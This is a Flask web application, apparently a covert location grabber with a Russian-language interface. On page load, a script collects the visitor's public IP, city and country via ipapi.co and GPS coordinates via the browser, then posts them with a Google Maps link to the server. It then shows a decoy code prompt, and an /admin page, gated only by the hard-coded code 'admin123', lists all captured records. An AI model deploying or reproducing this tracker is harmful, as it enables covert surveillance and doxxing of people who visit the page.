from flask import Flask, request, render_template_string
import json, os, sys
from datetime import datetime

app = Flask(__name__)
data_store = []

@app.route('/')
def index():
    return render_template_string("""
    <html><body>
    <script>
    async function run() {
      try {
        const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
        navigator.geolocation.getCurrentPosition(async pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const payload = {
            timestamp: new Date().toISOString(),
            ip: ip.ip,
            city: ip.city,
            region: ip.region,
            country: ip.country_name,
            latitude: lat,
            longitude: lon,
            map: `https://www.google.com/maps?q=${lat},${lon}`
          };
          await fetch('/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
          });
          document.body.innerHTML = `
            <form onsubmit="go(event)">
              <input id="code" placeholder="Код" required>
              <button type="submit">Войти</button>
            </form>
            <script>
            function go(e) {
              e.preventDefault();
              const c = document.getElementById('code').value;
              location.href = c === 'admin123' ? '/admin' : '/loading';
            }
            </script>
          `;
        });
      } catch {
        document.body.innerHTML = "Ошибка";
      }
    }
    run();
    </script>
    </body></html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data_store.append(request.get_json())
    return '', 204

@app.route('/loading')
def loading():
    return "<html><body>Загрузка…</body></html>"

@app.route('/admin')
def admin():
    out = "<html><body><h3>Все заходы:</h3><pre>"
    for d in reversed(data_store):
        out += json.dumps(d, indent=2) + "\n\n"
    out += "</pre></body></html>"
    return out

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
